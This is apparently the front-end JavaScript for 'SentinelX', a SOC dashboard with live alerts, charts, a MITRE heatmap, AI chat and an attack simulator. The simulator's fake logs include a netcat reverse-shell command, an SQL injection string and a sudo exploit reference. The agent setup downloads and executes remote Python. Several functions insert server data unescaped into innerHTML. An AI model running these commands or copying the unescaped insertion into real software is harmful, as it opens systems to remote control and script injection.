// SentinelX AI SOC Dashboard Logic
const token = localStorage.getItem("token");
const username = localStorage.getItem("username");
const role = localStorage.getItem("role");

if (!token) {
    window.location.href = "index.html";
}

const API_BASE = window.location.protocol === "file:" ? "http://localhost:8000/api" : "/api";
const WS_SCHEME = window.location.protocol === "https:" ? "wss" : "ws";
const WS_HOST = window.location.protocol === "file:" ? "localhost:8000" : window.location.host;
const WS_URL = `${WS_SCHEME}://${WS_HOST}/ws/${token}`;

let severityChart = null;
let currentTab = "overview";
let socket = null;
let registeredEndpoints = [];

// Initialize Dashboard UI
document.addEventListener("DOMContentLoaded", () => {
    // Populate profile card
    document.getElementById("profile-username").innerText = username;
    document.getElementById("profile-role").innerText = role.toUpperCase();
    document.getElementById("user-avatar").innerText = username.charAt(0).toUpperCase();
    
    // Tier check removed - Community Edition is free for all
    
    // Set current time ticker
    updateTimeBadge();
    setInterval(updateTimeBadge, 1000);

    // Setup Agent Copy block
    setupAgentInstallCommand();

    // Fetch initial stats and tables
    fetchDashboardStats();
    fetchEndpointsList();
    fetchAlertsList();
    initWebSocket();
});

function updateTimeBadge() {
    const now = new Date();
    const utcStr = now.toISOString().replace('T', ' ').substring(0, 19);
    document.getElementById("current-time-badge").innerText = `UTC: ${utcStr}`;
}

function setupAgentInstallCommand() {
    const cmdElement = document.getElementById("agent-command-string");
    const fullServer = window.location.protocol === "file:" ? "http://localhost:8000" : `${window.location.protocol}//${window.location.host}`;
    cmdElement.innerText = `python3 -c "import urllib.request; exec(urllib.request.urlopen('${fullServer}/static/agent.py').read())" --token "${token}" --server "${fullServer}"`;
}

function copyInstallCommand() {
    const text = document.getElementById("agent-command-string").innerText;
    navigator.clipboard.writeText(text).then(() => {
        alert("Agent installation command copied to clipboard!");
    }).catch(err => {
        alert("Failed to copy command: " + err);
    });
}

function switchTab(tabId) {
    // Hide all tabs
    const tabs = ["overview", "alerts", "mitre", "ai-chat", "endpoints"];
    tabs.forEach(t => {
        document.getElementById(`tab-${t}`).classList.add("hidden");
        const btn = document.getElementById(`nav-${t}`);
        if (btn) {
            btn.className = "w-full flex items-center gap-3.5 px-4 py-3 rounded-lg text-sm font-semibold text-gray-400 hover:text-white hover:bg-gray-800/40 transition-all";
        }
    });

    // Show active tab
    document.getElementById(`tab-${tabId}`).classList.remove("hidden");
    const activeBtn = document.getElementById(`nav-${tabId}`);
    if (activeBtn) {
        activeBtn.className = "w-full flex items-center gap-3.5 px-4 py-3 rounded-lg text-sm font-semibold transition-all text-cyan-400 bg-cyan-500/5 border border-cyan-500/10";
    }

    currentTab = tabId;

    if (tabId === "ai-chat") {
        fetchChatHistory();
    }
}

// Websocket connection
function initWebSocket() {
    const statusBadge = document.getElementById("ws-status");
    try {
        socket = new WebSocket(WS_URL);
        
        socket.onopen = () => {
            console.log("[WS] Connected to SentinelX live feed");
            statusBadge.className = "text-xs bg-emerald-500/10 border border-emerald-500/20 text-emerald-400 px-2 py-0.5 rounded flex items-center gap-1.5";
            statusBadge.innerHTML = '<span class="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-pulse"></span> Websocket Online';
        };

        socket.onmessage = (event) => {
            const msg = JSON.parse(event.data);
            if (msg.event === "new_alert") {
                handleIncomingLiveAlert(msg.data);
            } else if (msg.event === "metric_update") {
                handleIncomingLiveMetrics(msg.data);
            }
        };

        socket.onclose = () => {
            console.log("[WS] Connection lost. Reconnecting...");
            statusBadge.className = "text-xs bg-yellow-500/10 border border-yellow-500/20 text-yellow-500 px-2 py-0.5 rounded flex items-center gap-1.5";
            statusBadge.innerHTML = '<span class="w-1.5 h-1.5 rounded-full bg-yellow-400 animate-ping"></span> Attempting Reconnect...';
            setTimeout(initWebSocket, 5000);
        };
    } catch (e) {
        console.error("WS initiation error", e);
    }
}

async function fetchDashboardStats() {
    try {
        const response = await fetch(`${API_BASE}/dashboard/stats`, {
            headers: { "Authorization": `Bearer ${token}` }
        });
        const data = await response.json();
        if (response.ok) {
            document.getElementById("stat-endpoints").innerText = data.total_endpoints;
            document.getElementById("stat-online-endpoints").innerText = `${data.online_endpoints} active`;
            document.getElementById("stat-unresolved-alerts").innerText = data.unresolved_alerts;
            document.getElementById("stat-critical-alerts").innerText = data.critical_alerts;
            document.getElementById("stat-risk-score").innerText = data.risk_score;
            
            const riskEval = document.getElementById("risk-score-eval");
            if (data.risk_score > 70) {
                riskEval.innerText = "/100 Critical Risk";
                riskEval.className = "text-xs font-bold text-red-500";
            } else if (data.risk_score > 30) {
                riskEval.innerText = "/100 Moderate Risk";
                riskEval.className = "text-xs font-bold text-yellow-500";
            } else {
                riskEval.innerText = "/100 Secure Space";
                riskEval.className = "text-xs font-bold text-emerald-400";
            }
        }
    } catch (err) {
        console.error("Failed fetching dashboard statistics: ", err);
    }
}

async function fetchEndpointsList() {
    try {
        const response = await fetch(`${API_BASE}/dashboard/endpoints`, {
            headers: { "Authorization": `Bearer ${token}` }
        });
        const data = await response.json();
        if (response.ok) {
            registeredEndpoints = data;
            renderEndpoints(data);
        }
    } catch (err) {
        console.error("Error endpoints fetching", err);
    }
}

function renderEndpoints(endpoints) {
    const container = document.getElementById("endpoint-hosts-container");
    if (endpoints.length === 0) {
        container.innerHTML = `
            <div class="glass p-6 rounded-xl flex items-center justify-center border border-dashed border-gray-800 text-gray-500 text-xs col-span-2 py-12">
                No endpoints registered. Run the installation script above to link your host.
            </div>
        `;
        document.getElementById("dist-total").innerText = 0;
        document.getElementById("dist-linux").innerText = 0;
        document.getElementById("dist-windows").innerText = 0;
        return;
    }

    let linuxCount = 0;
    let windowsCount = 0;
    
    container.innerHTML = endpoints.map(e => {
        const isOnline = e.status === "online";
        if (isOnline) {
            if (e.os.includes("linux")) linuxCount++;
            if (e.os.includes("windows")) windowsCount++;
        }

        const osIcon = e.os.includes("linux") ? "fa-linux text-gray-300" : e.os.includes("windows") ? "fa-windows text-blue-400" : "fa-desktop text-gray-500";
        return `
            <div class="glass p-5 rounded-xl border border-gray-800 space-y-4" id="card-endpoint-${e.id}">
                <div class="flex justify-between items-start">
                    <div class="flex items-center gap-3">
                        <i class="fa-brands ${osIcon} text-2xl"></i>
                        <div>
                            <h4 class="text-sm font-bold text-white">${e.hostname}</h4>
                            <p class="text-[10px] text-gray-500 font-mono">${e.ip_address || "No External IP"}</p>
                        </div>
                    </div>
                    <span class="text-[9px] uppercase tracking-wider font-extrabold px-2 py-0.5 rounded ${isOnline ? 'bg-emerald-500/10 text-emerald-400 border border-emerald-500/20' : 'bg-gray-800 text-gray-500 border border-gray-700'}" id="status-endpoint-${e.id}">
                        ${e.status}
                    </span>
                </div>
                
                <div class="grid grid-cols-3 gap-3 text-center">
                    <div class="bg-gray-950/40 p-2.5 rounded border border-gray-900/60">
                        <span class="text-[9px] text-gray-500 block uppercase">CPU Load</span>
                        <span class="text-sm font-bold text-white font-mono" id="cpu-endpoint-${e.id}">${e.cpu_usage}%</span>
                    </div>
                    <div class="bg-gray-950/40 p-2.5 rounded border border-gray-900/60">
                        <span class="text-[9px] text-gray-500 block uppercase">RAM Usage</span>
                        <span class="text-sm font-bold text-white font-mono" id="ram-endpoint-${e.id}">${e.ram_usage}%</span>
                    </div>
                    <div class="bg-gray-950/40 p-2.5 rounded border border-gray-900/60">
                        <span class="text-[9px] text-gray-500 block uppercase">Storage</span>
                        <span class="text-sm font-bold text-white font-mono" id="disk-endpoint-${e.id}">${e.disk_usage}%</span>
                    </div>
                </div>
            </div>
        `;
    }).join("");

    document.getElementById("dist-total").innerText = endpoints.length;
    document.getElementById("dist-linux").innerText = linuxCount;
    document.getElementById("dist-windows").innerText = windowsCount;
}

let allAlerts = [];

async function fetchAlertsList() {
    try {
        const response = await fetch(`${API_BASE}/dashboard/alerts`, {
            headers: { "Authorization": `Bearer ${token}` }
        });
        const data = await response.json();
        if (response.ok) {
            allAlerts = data;
            applyAlertFilters();
            renderSeverityChart(data);
            highlightMitreHeatmap(data);
        }
    } catch (err) {
        console.error("Alert logs fetch failed", err);
    }
}

function applyAlertFilters() {
    const searchVal = document.getElementById("filter-search").value.toLowerCase();
    const severityVal = document.getElementById("filter-severity").value;
    const statusVal = document.getElementById("filter-status").value;

    const filtered = allAlerts.filter(a => {
        const matchesSearch = (
            a.attack_type.toLowerCase().includes(searchVal) ||
            (a.mitre_id && a.mitre_id.toLowerCase().includes(searchVal)) ||
            (a.tactic && a.tactic.toLowerCase().includes(searchVal)) ||
            (a.description && a.description.toLowerCase().includes(searchVal))
        );
        const matchesSeverity = !severityVal || a.severity === severityVal;
        const matchesStatus = !statusVal || a.status === statusVal;

        return matchesSearch && matchesSeverity && matchesStatus;
    });

    renderAlertsTable(filtered);
    renderOverviewAlerts(allAlerts.slice(0, 5));
}

function renderAlertsTable(alerts) {
    const tbody = document.getElementById("alerts-table-body");
    if (alerts.length === 0) {
        tbody.innerHTML = `
            <tr>
                <td colspan="8" class="p-6 text-center text-gray-600">No alerts matching filters found.</td>
            </tr>
        `;
        return;
    }

    tbody.innerHTML = alerts.map(a => {
        const timeFormatted = new Date(a.timestamp).toISOString().replace('T', ' ').substring(11, 19);
        const severityClass = getSeverityBadgeClass(a.severity);
        const isResolved = a.status === "resolved";
        
        return `
            <tr class="hover:bg-gray-900/10 border-b border-gray-900">
                <td class="p-4 font-semibold text-white">
                    <span class="block">${a.attack_type}</span>
                    <span class="text-[10px] text-gray-500 font-light block mt-0.5 truncate max-w-xs">${a.description}</span>
                </td>
                <td class="p-4 font-mono text-gray-300">${a.endpoint}</td>
                <td class="p-4">
                    <span class="${severityClass} text-[9px] uppercase tracking-wider font-extrabold px-2 py-0.5 rounded border">
                        ${a.severity}
                    </span>
                </td>
                <td class="p-4 text-cyan-400 font-semibold font-mono">${a.mitre_id || "None"} <span class="text-gray-600 block text-[9px] font-normal font-sans">${a.tactic || ""}</span></td>
                <td class="p-4">
                    <span class="text-[9px] px-1.5 py-0.5 rounded border ${isResolved ? 'bg-emerald-500/10 text-emerald-400 border-emerald-500/20' : 'bg-yellow-500/10 text-yellow-500 border-yellow-500/20'}">
                        ${a.status}
                    </span>
                </td>
                <td class="p-4 text-gray-500 font-mono">${timeFormatted}</td>
                <td class="p-4 text-center">
                    <button onclick="requestAIAnalysis(${a.id})" class="text-cyan-400 hover:text-cyan-300 hover:underline font-bold">
                        <i class="fa-solid fa-brain"></i> Triage
                    </button>
                </td>
                <td class="p-4 text-right">
                    ${!isResolved ? `<button onclick="resolveAlert(${a.id})" class="bg-gray-800 hover:bg-gray-700 text-gray-300 px-2 py-1 rounded text-[10px] font-bold">Resolve</button>` : '<span class="text-gray-600 text-[10px]">Handled</span>'}
                </td>
            </tr>
        `;
    }).join("");
}

function renderOverviewAlerts(alerts) {
    const tbody = document.getElementById("overview-alerts-body");
    if (alerts.length === 0) {
        tbody.innerHTML = `
            <tr>
                <td colspan="5" class="py-6 text-center text-gray-600">No security logs recorded yet.</td>
            </tr>
        `;
        return;
    }

    tbody.innerHTML = alerts.map(a => {
        const timeFormatted = new Date(a.timestamp).toISOString().replace('T', ' ').substring(11, 19);
        const severityClass = getSeverityBadgeClass(a.severity);

        return `
            <tr class="border-b border-gray-900/60 hover:bg-gray-900/10">
                <td class="py-3 font-semibold text-white">
                    ${a.attack_type}
                    <span class="text-[9px] text-gray-500 block font-normal">${a.tactic || "Correlation Engine"}</span>
                </td>
                <td class="py-3 font-mono text-gray-400">${a.endpoint}</td>
                <td class="py-3">
                    <span class="${severityClass} text-[8px] px-1.5 py-0.2 rounded border">
                        ${a.severity}
                    </span>
                </td>
                <td class="py-3 font-mono text-cyan-400">${a.mitre_id || "None"}</td>
                <td class="py-3 text-right text-gray-500 font-mono">${timeFormatted}</td>
            </tr>
        `;
    }).join("");
}

function getSeverityBadgeClass(sev) {
    if (sev === "critical") return "bg-red-500/10 text-red-500 border-red-500/30 glow-cyan";
    if (sev === "high") return "bg-orange-500/10 text-orange-400 border-orange-500/30";
    if (sev === "medium") return "bg-yellow-500/10 text-yellow-500 border-yellow-500/30";
    return "bg-cyan-500/10 text-cyan-400 border-cyan-500/30";
}

async function resolveAlert(id) {
    try {
        const response = await fetch(`${API_BASE}/dashboard/alerts/${id}/resolve`, {
            method: "POST",
            headers: { "Authorization": `Bearer ${token}` }
        });
        if (response.ok) {
            fetchDashboardStats();
            fetchAlertsList();
        }
    } catch (err) {
        console.error("Resolve error: ", err);
    }
}

// AI Forensic Analysis Triage
async function requestAIAnalysis(alertId) {
    const panel = document.getElementById("ai-triage-panel");
    const content = document.getElementById("ai-triage-content");
    
    panel.classList.remove("hidden");
    content.innerText = "Analyzing security signatures...\nQuoting Groq threat indexes...\nParsing mitigation frameworks...";
    panel.scrollIntoView({ behavior: 'smooth' });

    try {
        const response = await fetch(`${API_BASE}/ai/analyze-alert/${alertId}`, {
            method: "POST",
            headers: {
                "Authorization": `Bearer ${token}`
            }
        });
        
        const data = await response.json();
        if (response.ok) {
            content.innerText = data.analysis;
        } else {
            content.innerText = `[ERROR] Triage failed: ${data.detail || "AI Analyst service is currently unavailable."}`;
        }
    } catch (err) {
        content.innerText = "[ERROR] AI service currently unreachable.";
    }
}

function closeTriagePanel() {
    document.getElementById("ai-triage-panel").classList.add("hidden");
}

// Websocket listeners
function handleIncomingLiveAlert(alert) {
    // Insert into front of alert arrays
    allAlerts.unshift(alert);
    
    // Refresh tables & indicators
    applyAlertFilters();
    fetchDashboardStats();
    renderSeverityChart(allAlerts);
    highlightMitreHeatmap(allAlerts);

    // Audio chime notification
    try {
        const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
        const osc = audioCtx.createOscillator();
        const gain = audioCtx.createGain();
        osc.connect(gain);
        gain.connect(audioCtx.destination);
        osc.type = "sine";
        // Critical alerts ring high-frequency chirp
        osc.frequency.setValueAtTime(alert.severity === "critical" ? 880 : 440, audioCtx.currentTime);
        gain.gain.setValueAtTime(0.1, audioCtx.currentTime);
        osc.start();
        gain.gain.exponentialRampToValueAtTime(0.01, audioCtx.currentTime + 0.3);
        osc.stop(audioCtx.currentTime + 0.3);
    } catch(e) {}
}

function handleIncomingLiveMetrics(metric) {
    // Dynamic DOM updates for metrics widgets
    const cpuEl = document.getElementById(`cpu-endpoint-${metric.endpoint_id}`);
    const ramEl = document.getElementById(`ram-endpoint-${metric.endpoint_id}`);
    const diskEl = document.getElementById(`disk-endpoint-${metric.endpoint_id}`);
    const statusEl = document.getElementById(`status-endpoint-${metric.endpoint_id}`);

    if (cpuEl) cpuEl.innerText = `${metric.cpu}%`;
    if (ramEl) ramEl.innerText = `${metric.ram}%`;
    if (diskEl) diskEl.innerText = `${metric.disk}%`;
    if (statusEl) {
        statusEl.innerText = metric.status;
        statusEl.className = "text-[9px] uppercase tracking-wider font-extrabold px-2 py-0.5 rounded bg-emerald-500/10 text-emerald-400 border border-emerald-500/20";
    }
}

// Chart.js rendering
function renderSeverityChart(alerts) {
    const ctx = document.getElementById("chart-severity").getContext("2d");
    
    const counts = { critical: 0, high: 0, medium: 0, low: 0 };
    alerts.forEach(a => {
        if (counts[a.severity] !== undefined) counts[a.severity]++;
    });

    const dataset = [counts.critical, counts.high, counts.medium, counts.low];

    if (severityChart) {
        severityChart.data.datasets[0].data = dataset;
        severityChart.update();
        return;
    }

    severityChart = new Chart(ctx, {
        type: 'doughnut',
        data: {
            labels: ['Critical', 'High', 'Medium', 'Low'],
            datasets: [{
                data: dataset,
                backgroundColor: ['#ef4444', '#f97316', '#eab308', '#06b6d4'],
                borderWidth: 1,
                borderColor: '#080c14'
            }]
        },
        options: {
            responsive: true,
            maintainAspectRatio: false,
            plugins: {
                legend: {
                    position: 'bottom',
                    labels: {
                        color: '#9ca3af',
                        font: { size: 9 },
                        boxWidth: 8
                    }
                }
            },
            cutout: '70%'
        }
    });
}

// MITRE Heatmap triggers
function highlightMitreHeatmap(alerts) {
    // Reset all matrix cells first
    const cells = document.querySelectorAll(".matrix-cell");
    cells.forEach(c => {
        c.className = "matrix-cell bg-gray-900/50 border border-gray-800/80 p-3 rounded text-[11px] cursor-pointer hover:bg-gray-800/40 text-center";
    });

    alerts.forEach(a => {
        if (a.mitre_id) {
            const cell = document.getElementById(`mitre-${a.mitre_id}`);
            if (cell) {
                // Style cell based on severity
                if (a.severity === "critical") {
                    cell.className = "matrix-cell bg-red-950/40 border border-red-500/50 p-3 rounded text-[11px] cursor-pointer text-center text-red-400 font-extrabold shadow-lg";
                } else if (a.severity === "high") {
                    cell.className = "matrix-cell bg-orange-950/40 border border-orange-500/50 p-3 rounded text-[11px] cursor-pointer text-center text-orange-400 font-bold";
                } else {
                    cell.className = "matrix-cell bg-cyan-950/40 border border-cyan-500/50 p-3 rounded text-[11px] cursor-pointer text-center text-cyan-400";
                }
            }
        }
    });
}

function explainMitre(id, name) {
    const box = document.getElementById("mitre-explanation-box");
    const title = document.getElementById("mitre-expl-title");
    const desc = document.getElementById("mitre-expl-desc");

    box.classList.remove("hidden");
    title.innerText = `MITRE ATT&CK [${id}] - ${name}`;

    const matchingAlerts = allAlerts.filter(a => a.mitre_id === id);

    if (matchingAlerts.length > 0) {
        desc.innerHTML = `
            <span class="text-red-400 font-bold block mb-1">Active Alerts for this Technique: ${matchingAlerts.length}</span>
            <ul class="list-disc pl-4 space-y-1 text-gray-300">
                ${matchingAlerts.map(a => `<li>${a.attack_type} on host <strong>${a.endpoint}</strong> (${a.status})</li>`).join("")}
            </ul>
        `;
    } else {
        desc.innerText = `No current security violations map to ${id} (${name}) in this environment. Keep monitoring endpoint processes to trace potential execution pathways.`;
    }
}

// AI Chat panel
async function fetchChatHistory() {
    try {
        const response = await fetch(`${API_BASE}/ai/history`, {
            headers: { "Authorization": `Bearer ${token}` }
        });
        const data = await response.json();
        if (response.ok) {
            const container = document.getElementById("chat-messages-container");
            // Keep first welcome message
            const welcome = container.firstElementChild;
            container.innerHTML = "";
            container.appendChild(welcome);

            data.forEach(m => {
                appendChatMessage(m.role, m.content);
            });
            scrollChatBottom();
        }
    } catch (err) {
        console.error("Chat logs load fail", err);
    }
}

function appendChatMessage(role, text) {
    const container = document.getElementById("chat-messages-container");
    const bubble = document.createElement("div");
    
    if (role === "user") {
        bubble.className = "flex gap-3 max-w-xl bg-gray-900 border border-gray-800 p-3.5 rounded-lg text-xs self-end text-left";
        bubble.innerHTML = `
            <div class="space-y-1">
                <p class="font-bold text-gray-400">You</p>
                <p class="text-gray-200 font-mono whitespace-pre-wrap">${text}</p>
            </div>
        `;
    } else {
        bubble.className = "flex gap-3 max-w-xl bg-cyan-950/20 border border-cyan-500/10 p-3.5 rounded-lg text-xs self-start text-left";
        bubble.innerHTML = `
            <div class="w-7 h-7 rounded bg-cyan-500 flex items-center justify-center font-bold text-gray-950 flex-shrink-0">AI</div>
            <div class="space-y-1">
                <p class="font-bold text-white">SentinelX Analyst Assistant</p>
                <p class="text-gray-300 leading-relaxed font-mono whitespace-pre-wrap">${text}</p>
            </div>
        `;
    }
    container.appendChild(bubble);
}

function scrollChatBottom() {
    const container = document.getElementById("chat-messages-container");
    container.scrollTop = container.scrollHeight;
}

async function handleSendChatMessage(e) {
    e.preventDefault();
    const input = document.getElementById("chat-input");
    const val = input.value.trim();
    if (!val) return;

    input.value = "";
    appendChatMessage("user", val);
    scrollChatBottom();

    // Show typing bubble
    const typingBubble = document.createElement("div");
    typingBubble.className = "flex gap-3 max-w-xs bg-cyan-950/10 border border-cyan-500/5 p-3 rounded-lg text-xs self-start text-left text-gray-500 font-mono italic";
    typingBubble.id = "chat-typing-indicator";
    typingBubble.innerText = "SentinelX is preparing response...";
    document.getElementById("chat-messages-container").appendChild(typingBubble);
    scrollChatBottom();

    try {
        const response = await fetch(`${API_BASE}/ai/chat`, {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
                "Authorization": `Bearer ${token}`
            },
            body: JSON.stringify({ message: val })
        });
        
        const data = await response.json();
        
        // Remove typing indicator
        const indicator = document.getElementById("chat-typing-indicator");
        if (indicator) indicator.remove();

        if (response.ok) {
            appendChatMessage("assistant", data.response);
        } else {
            appendChatMessage("assistant", "Error: failed to generate response. Check your API settings.");
        }
        scrollChatBottom();
    } catch (err) {
        const indicator = document.getElementById("chat-typing-indicator");
        if (indicator) indicator.remove();
        appendChatMessage("assistant", "Error connecting to AI inference service.");
        scrollChatBottom();
    }
}

function sendChatFromChip(msg) {
    document.getElementById("chat-input").value = msg;
    const mockEvent = { preventDefault: () => {} };
    handleSendChatMessage(mockEvent);
}

// Cyber Simulation Range Controller (Option B Light simulator)
async function triggerSimulatedAttack(type) {
    // 1. Check if we have registered endpoints, if not make one!
    let endpointId = null;
    if (registeredEndpoints.length === 0) {
        try {
            const regResponse = await fetch(`${API_BASE}/agent/register`, {
                method: "POST",
                headers: {
                    "Content-Type": "application/json",
                    "Authorization": `Bearer ${token}`
                },
                body: JSON.stringify({
                    hostname: "debian-attack-sandbox",
                    os: "linux",
                    ip_address: "192.168.10.25"
                })
            });
            const regData = await regResponse.json();
            endpointId = regData.endpoint_id;
            await fetchEndpointsList();
        } catch (e) {
            alert("Failed registering simulator host.");
            return;
        }
    } else {
        endpointId = registeredEndpoints[0].id;
    }

    // 2. Draft log payloads depending on type selected
    let logs = [];
    if (type === "brute_force") {
        logs = [{
            log_type: "auth",
            log_content: "May 23 00:08:42 debian sshd[28441]: Failed password for invalid user root from 198.51.100.42 port 49282 ssh2",
            severity: "warning"
        }];
    } else if (type === "sqli") {
        logs = [{
            log_type: "application",
            log_content: "192.168.10.42 - - [23/May/2026:00:10:14 +0000] \"POST /login.php HTTP/1.1\" 200 482 \"-\" \"SELECT * FROM users WHERE username = 'admin' OR '1'='1'--\"",
            severity: "error"
        }];
    } else if (type === "malware") {
        logs = [{
            log_type: "process",
            log_content: "CRITICAL: Malicious connection spawned to Command & Control: execution shell '/bin/sh' spawned process 'nc -e /bin/sh 198.51.100.42 4444'",
            severity: "critical"
        }];
    } else if (type === "privilege") {
        logs = [{
            log_type: "system",
            log_content: "sudo: pam_authenticate: Privilege Escalation exploit execution detected via CVE-2021-3156 (Sudo Baron Samedit)",
            severity: "critical"
        }];
    }

    // 3. Post metrics + logs report
    try {
        const response = await fetch(`${API_BASE}/agent/report`, {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
                "Authorization": `Bearer ${token}`
            },
            body: JSON.stringify({
                endpoint_id: endpointId,
                cpu_usage: Math.floor(Math.random() * 20) + 70, // Attack causes CPU load spike
                ram_usage: Math.floor(Math.random() * 10) + 50,
                disk_usage: 34.2,
                processes: ["sshd", "nginx", "python3", "bash", "nc"],
                logs: logs
            })
        });

        if (response.ok) {
            console.log(`[Simulator] Simulated attack payload sent successfully`);
            fetchDashboardStats();
            fetchAlertsList();
        } else {
            console.error("Simulation ingestion fail");
        }
    } catch(e) {
        console.error("Simulation api call fail", e);
    }
}

// CSV export
function exportAlertsCSV() {
    if (allAlerts.length === 0) {
        alert("No alerts to export.");
        return;
    }
    const headers = ["ID", "Endpoint", "Severity", "Attack Type", "MITRE ID", "Tactic", "Status", "Timestamp"];
    const rows = allAlerts.map(a => [
        a.id,
        a.endpoint,
        a.severity,
        `"${a.attack_type.replace(/"/g, '""')}"`,
        a.mitre_id || "None",
        a.tactic || "None",
        a.status,
        a.timestamp
    ]);

    const csvContent = "data:text/csv;charset=utf-8," 
        + [headers.join(","), ...rows.map(e => e.join(","))].join("\n");
        
    const encodedUri = encodeURI(csvContent);
    const link = document.createElement("a");
    link.setAttribute("href", encodedUri);
    link.setAttribute("download", `sentinelx_alerts_export_${Date.now()}.csv`);
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
}

// PDF export mock
function exportAlertsPDF() {
    if (allAlerts.length === 0) {
        alert("No logs or alerts recorded for report compilation.");
        return;
    }
    
    // We print window element cleanly to create custom incident report layout
    const printWindow = window.open("", "_blank");
    const utcStr = new Date().toISOString().replace('T', ' ').substring(0, 19);
    
    printWindow.document.write(`
        <html>
        <head>
            <title>SentinelX AI - Security Incident Report</title>
            <style>
                body { font-family: monospace; padding: 40px; color: #111; }
                h1 { border-bottom: 2px solid #000; padding-bottom: 10px; }
                .meta { margin-bottom: 30px; font-size: 12px; color: #555; }
                table { width: 100%; border-collapse: collapse; margin-top: 20px; }
                th, td { border: 1px solid #ddd; padding: 10px; text-align: left; font-size: 11px; }
                th { background-color: #f4f4f4; }
                .sev-critical { color: red; font-weight: bold; }
                .sev-high { color: orange; font-weight: bold; }
            </style>
        </head>
        <body>
            <h1>SENTINELX AI - AUDIT COMPLIANCE REPORT</h1>
            <div class="meta">
                <p>Report Compiled: ${utcStr} (UTC)</p>
                <p>Incident Scope: Tenant logs and mappings</p>
                <p>Total Flagged Alerts: ${allAlerts.length}</p>
            </div>
            <h2>RECORDED VECTORS INTRUSIONS:</h2>
            <table>
                <thead>
                    <tr>
                        <th>ID</th>
                        <th>Endpoint</th>
                        <th>Attack Type</th>
                        <th>Severity</th>
                        <th>MITRE ID</th>
                        <th>Tactic</th>
                        <th>Timestamp</th>
                    </tr>
                </thead>
                <tbody>
                    ${allAlerts.map(a => `
                        <tr>
                            <td>${a.id}</td>
                            <td>${a.endpoint}</td>
                            <td>${a.attack_type}</td>
                            <td class="sev-${a.severity}">${a.severity.toUpperCase()}</td>
                            <td>${a.mitre_id || "None"}</td>
                            <td>${a.tactic || "None"}</td>
                            <td>${a.timestamp}</td>
                        </tr>
                    `).join("")}
                </tbody>
            </table>
            <p style="margin-top: 50px; font-size: 10px; color: #777; text-align: center;">CONFIDENTIAL - INTERNAL SOC USE ONLY</p>
            <script>window.print();</script>
        </body>
        </html>
    `);
    printWindow.document.close();
}

// Upgrade check deprecated

function handleLogout() {
    localStorage.clear();
    window.location.href = "index.html";
}
